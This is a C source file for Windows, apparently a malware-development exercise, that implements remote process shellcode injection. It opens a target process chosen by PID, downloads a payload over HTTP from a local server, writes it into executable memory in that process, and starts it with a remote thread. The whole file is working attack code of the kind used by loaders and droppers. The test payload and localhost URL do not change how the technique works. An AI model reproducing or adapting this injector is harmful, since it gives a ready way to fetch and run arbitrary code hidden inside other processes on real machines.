#include <Windows.h>
#include <wininet.h>
#include <stdio.h>

const char* s = "[+]";
const char* f = "[-]";
const char* w = "[*]";


int main(int argc, char* argv[]) {


	DWORD PID, TID, dwBytesRead = NULL;
	HANDLE hProcess, hThread = NULL;
	LPCWSTR sourceURL = L"http://127.0.0.1:8000/calc.bin";
	PBYTE pBytes = NULL;
	PBYTE pTmpBytes = NULL;
	SIZE_T sSize = NULL;
	LPVOID rBuffer = NULL;
	HINTERNET hInet, hURL = NULL;

	PBYTE* pPayloadBytes = NULL;
	SIZE_T* sPayloadBytes = NULL;


	if (argc < 2) {
		printf("%s Not enough arguments!", f);

		return 1;
	}

	PID = atoi(argv[1]);
	printf("%s attempting to open a handle to the provided process (%ld)\n", w, PID);


	// open a handle to the provided process
	hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, PID);

	if (hProcess == NULL) {
		printf("%s could not open a handle to the provided process... Error: %ld", f, GetLastError());
		return 1;
	}

	printf("%s successfully opened a handle to the provided process!\n\\---0x%p\n", s, hProcess);

	// open handle to WinInet
	hInet = InternetOpenW(NULL, NULL, NULL, NULL, NULL);

	if (hInet == NULL) {
		printf("%s could not open a handle to hInet... Error: %ld", f, GetLastError());
		CloseHandle(hProcess);
		return 1;
	}

	printf("%s successfully opened a handle to WinInet!\n", s);

	// open handle to payload's URL
	hURL = InternetOpenUrlW(hInet, sourceURL, NULL, NULL, INTERNET_FLAG_HYPERLINK | INTERNET_FLAG_IGNORE_CERT_DATE_INVALID, NULL);

	if (hURL == NULL) {
		printf("%s could not open a handle to URL... Error: %ld", f, GetLastError());
		CloseHandle(hProcess);
		CloseHandle(hInet);
		return 1;
	}

	printf("%s successfully opened a handle to the provided URL!\n", s);

	// allocate 1024 bytes to temporary buffer
	pTmpBytes = (PBYTE)LocalAlloc(LPTR, 1024);

	if (pTmpBytes == NULL) {
		return 1; // i am so fucking tired of error handling
		LocalFree(pTmpBytes);
		InternetCloseHandle(hURL);
		CloseHandle(hInet);
		CloseHandle(hProcess);
	}

	printf("%s successfully allocated memory to temp buffer!\n\\---0x%p\n", s, pTmpBytes);

	// read data
	while (TRUE) {
		// read 1024 bytes to temp buffer
		if (!InternetReadFile(hURL, pTmpBytes, 1024, &dwBytesRead)) {
			printf("%s could not read contents of specified file... Error: %ld\n", f, GetLastError());
			LocalFree(pTmpBytes);
			InternetCloseHandle(hURL);
			CloseHandle(hInet);
			CloseHandle(hProcess);
			return 1;
		}

		// update size of the final buffer
		sSize += dwBytesRead;

		// allocate final buffer
		if (pBytes == NULL) {
			pBytes = (PBYTE)LocalAlloc(LPTR, dwBytesRead);
		}
		else {
			// if it wasn't NULL, reallocate it to == sSize
			pBytes = (PBYTE)LocalReAlloc(pBytes, sSize, LMEM_MOVEABLE | LMEM_ZEROINIT);
		}

		if (pBytes == NULL) {
			LocalFree(pBytes);
			LocalFree(pTmpBytes);
			InternetCloseHandle(hURL);
			CloseHandle(hInet);
			CloseHandle(hProcess);
			return 1; // as i said, i am sick and tired of error handling, get off my dick
		}

		// append the temp buffer to the end of the total buffer
		memcpy((PVOID)(pBytes + (sSize - dwBytesRead)), pTmpBytes, dwBytesRead);

		if (dwBytesRead < 1024) {
			break;
		}
	}

	// allocate memory for the payload copy
	pPayloadBytes = (PBYTE*)malloc(sSize);
	if (pPayloadBytes != NULL) {
		memcpy(pPayloadBytes, pBytes, sSize);
		printf("%s payload initialised\n\---0x%p", s, pPayloadBytes);
	}

	// allocate memory for size
	sPayloadBytes = (size_t*)malloc(sizeof(size_t));
	if (sPayloadBytes != NULL) {
		*sPayloadBytes = sSize;
		printf("%s payload size initialised\n", s);
	}


	// clean up
	printf("%s closing previously created inet handles and freeing memory\n", w);
	InternetCloseHandle(hInet);
	InternetCloseHandle(hURL);
	InternetSetOptionW(NULL, INTERNET_OPTION_SETTINGS_CHANGED, NULL, 0);
	LocalFree(pTmpBytes);
	LocalFree(pBytes);
	printf("%s success\n", s);

	// allocate bytes in the memory of the specified process
	rBuffer = VirtualAllocEx(hProcess, NULL, sSize, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);

	if (rBuffer == NULL) {
		printf("%s could not allocate memory in host process... Error: %ld", f, GetLastError());
		CloseHandle(hProcess);
		free(pPayloadBytes);
		free(sPayloadBytes);
		return 1;
	}
	else {
		printf("%s allocated buffer in specified process\n", s);
	}

	// actually write to the memory of the specified process
	if (pPayloadBytes != NULL and sPayloadBytes != NULL) {
		WriteProcessMemory(hProcess, rBuffer, pPayloadBytes, *sPayloadBytes, NULL);
		printf("%s successfully wrote %zu-bytes to memory of specified process\n", s, sSize);
	}
	// create thread to run the payload
	hThread = CreateRemoteThreadEx(hProcess, NULL, 0, (LPTHREAD_START_ROUTINE)rBuffer, NULL, 0, 0, &TID);

	if (hThread != NULL) {
		printf("%s successfully opened a handle to created thread! (%ld)\n\\---0x%p\n", s, TID, hThread);
	}
	else {
		printf("%s could not open a handle to thread... Error: %ld", f, GetLastError());
		CloseHandle(hProcess);
		VirtualFree(rBuffer, 0, MEM_RELEASE);
		free(pPayloadBytes);
		free(sPayloadBytes);
		return 1;
	}

	WaitForSingleObject(hThread, INFINITE);
	printf("%s thread finished executing, cleaning up...\n", s);

	// clean up after yourself!
	CloseHandle(hProcess);
	CloseHandle(hThread);
	VirtualFree(rBuffer, 0, MEM_RELEASE);
	free(pPayloadBytes);
	free(sPayloadBytes);
	printf("%s closed handle to process", s);

	return 0;
}